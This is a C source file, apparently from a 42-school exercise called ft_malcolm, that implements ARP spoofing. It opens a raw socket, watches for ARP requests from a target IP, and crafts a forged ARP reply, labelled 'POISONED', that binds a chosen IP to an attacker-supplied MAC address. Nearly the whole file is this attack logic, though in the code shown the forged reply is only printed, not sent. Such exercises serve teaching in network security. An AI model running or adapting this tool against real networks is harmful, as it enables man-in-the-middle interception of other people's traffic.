/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jragot <jragot@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/09/15 21:21:52 by jragot            #+#    #+#             */
/*   Updated: 2021/10/28 22:15:30 by jragot           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

struct addr_set g_addresses;

struct hostent *gethost(const char *name)
{
	struct hostent *host = NULL;
	if ((host = gethostbyname(name)) != NULL)
		return (host);
	else
		printf("Error: %s is not a valid hostname\n", name);
	return (NULL);
}

struct ifaddrs *getinterface(struct ifaddrs *iflist,const char *name)
{
	while (iflist)
	{
		if (strcmp(iflist->ifa_name, name) == 0) // *** LIBC
			return (iflist);
		iflist = iflist->ifa_next;
	}
	return (NULL);
}

unsigned char	*craft_arp(unsigned char *output)
{
//	print_addr_set(g_addresses);
	struct ethhdr frame;
	struct arp_ip packet;
	
	memset(&frame, 0, sizeof(frame));			// *** LIBC
	memset(&packet, 0, sizeof(packet));			// *** LIBC
	memcpy(frame.h_dest, g_addresses.tmac, 6); // *** LIBC
	memcpy(frame.h_source, g_addresses.smac, 6); // *** LIBC
	memcpy(&frame.h_proto, "\x08\x06", 2);		// *** LIBC
	memcpy(packet.ar_hrd, "\x00\x01", 2);
	memcpy(packet.ar_pro, "\x08\x00", 2);
	packet.ar_hln = 6;
	packet.ar_pln = 4;
	memcpy(packet.ar_op, "\x00\x02", 2); // ARP REPLY OPCODE
	memcpy(packet.ar_sha, g_addresses.smac, 6);
	memcpy(packet.ar_sip, &g_addresses.sip, 4);
	memcpy(packet.ar_tha, g_addresses.tmac, 6);
	memcpy(packet.ar_tip, &g_addresses.tip, 4);
	memcpy(output, &frame, 28);					// *** LIBC
	memcpy(output+sizeof(frame), &packet, sizeof(packet));
	return (output);
}

void	arp_reply(struct arp_ip *request) // Maybe we can remove the function parameter
{
	unsigned char reply_output[42];
	printf("\e[31m(ARP REQUEST DETECTED FROM %d.%d.%d.%d)\n", request->ar_sip[0], request->ar_sip[1], request->ar_sip[2], request->ar_sip[3]);
	craft_arp(reply_output);
	printf("------ REPLYING (POISONED): ------\n");
	process_ethernet(reply_output, 42);
	printf("------ END OF REPLY: ------\e[0m\n");
}

void	better_verif(unsigned char *sip)
{
	if (memcmp(sip, &g_addresses.sip, 4) == 0)
		printf("IP addresses match\n");
	else
		printf("IP addresses do not match\n");
}

/*
void	verif_comp(unsigned char *sip)
{
	unsigned char source[4] = {0};

	memcpy(source, &g_addresses.sip, 4);
	printf("---------------\nVERIF\n");
	printf("IP (ARP): %d.%d.%d.%d\n", sip[0], sip[1], sip[2], sip[3]);
	printf("IP (CLI): %d.%d.%d.%d\n", source[0], source[1], source[2], source[3]);
	better_verif(sip);
	printf("---------------");
}
*/

void	process_arp(unsigned char *buffer)
{
	struct arp_ip *arp = (struct arp_ip *)(buffer); /* We create this structure specific to IP protocol for later */

	buffer += sizeof(struct arphdr);
	//printf("\nSIZE OF ETH STRUCT: %d", sizeof(struct ethhdr));
	//printf("\nSIZE OF ARP STRUCT: %d\n", sizeof(struct arphdr));
	printf("\n----ARP PAYLOAD:----\n");
	printf("|-Sender HW address: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5]);
	buffer += arp->ar_hln;
	printf("|-Sender IP address: %d.%d.%d.%d\n", buffer[0], buffer[1], buffer[2], buffer[3]);
	buffer += arp->ar_pln;
	printf("|-Target HW address: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5]);
	buffer += arp->ar_hln;
	printf("|-Target IP address: %d.%d.%d.%d\n", buffer[0], buffer[1], buffer[2], buffer[3]);
	buffer += arp->ar_pln;
	if (arp->ar_op[0] || (arp->ar_op[1] < 1 || arp->ar_op[1] > 2))
		printf("|-opcode: %.2x (Unknown operation)\n", arp->ar_op[1]);
	else
		printf("|-opcode: %.2x %s\n", arp->ar_op[1], (arp->ar_op[1] == 1) ? "(REQUEST)" : "(REPLY)");
	//verif_comp(arp->ar_sip);
	if (arp->ar_op[0] == 0 && arp->ar_op[1] == 1) /* We check if this is an ARP REQUEST */
		if (memcmp(arp->ar_sip, &g_addresses.tip, 4) == 0)
			arp_reply(arp);
	printf("------------------------------------\n\n");
}

void	process_ethernet(unsigned char *buffer, ssize_t buflen)
{
	struct ethhdr *eth = (struct ethhdr *)(buffer);

	if (ntohs(eth->h_proto) == ETH_P_ARP)
	{
		printf("\n*** ARP PACKET ***\nRaw frame:");
		print_buffer(buffer, buflen);
		printf("(%d bytes read from socket)\n", (unsigned int)buflen);
		printf("\n----ETHERNET HEADER:----\n");
		printf("|-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",eth->h_dest[0],eth->h_dest[1],eth->h_dest[2],eth->h_dest[3],eth->h_dest[4],eth->h_dest[5]);
		printf("|-Source Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",eth->h_source[0],eth->h_source[1],eth->h_source[2],eth->h_source[3],eth->h_source[4],eth->h_source[5]);
		printf("|-Protocol : %04x\n",ntohs(eth->h_proto));
		process_arp(buffer+sizeof(struct ethhdr)); // Don't forget to remove header size from buflen
	}
}

int	main(int ac, char **av)
{
	int fd;
//	struct hostent *host = NULL;
	struct ifaddrs *iflist = NULL;
	struct ifaddrs *interface = NULL;
	//struct addr_set addresses; //MOVED TO A GLOBAL VARIABLE
	unsigned char buffer[65536];
 	unsigned char output[42] = {0};  //(MOVED)

	requirements(ac, av);

	if (signal(SIGINT, sig_handler) == SIG_ERR)
		exit_error("Could not catch signal\n");
	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
		perror("error");		// *** LIBC
	if ((getifaddrs(&iflist) < 0))
		exit_error("Error: Failed to fetch interfaces");
	if ((interface = getinterface(iflist, "eth0")))
		printf("interface name is %s\n", interface->ifa_name);
//	int setsockopt(fd, SOL_SOCKET, int optname, const void *optval, socklen_t optlen)
	printf("socket is %d\n", fd);

	memset(buffer, 0, 65536);		// *** LIBC
	struct sockaddr saddr;
	int saddr_len = sizeof(saddr);
	ssize_t buflen = 0;

/* HERE CHECK THAT MAC AND IP ARE VALID (maybe already done in requirements() */
	memset(&g_addresses, 0, sizeof(g_addresses)); // *** LIBC
	g_addresses.sip = inet_addr(av[1]);
	feed_bin(g_addresses.smac, av[2]);
	g_addresses.tip = inet_addr(av[3]);
	feed_bin(g_addresses.tmac, av[4]);
	//craft_arp(output); // JUST FOR TEST ?
	process_ethernet(output, 42); // JUST FOR TEST ?
	while (1)
	{
		buflen = recvfrom(fd, buffer, 65536, 0, &saddr, (socklen_t *)&saddr_len);
		if (buflen < 0)
			exit_error("Failed to read from socket");
		process_ethernet(buffer, buflen);
	}
	/* Clean up */
	(close(fd)) != 0 ? printf("Error closing socket\n") : 0;
	if (iflist)
		freeifaddrs(iflist);
	return (0);
}
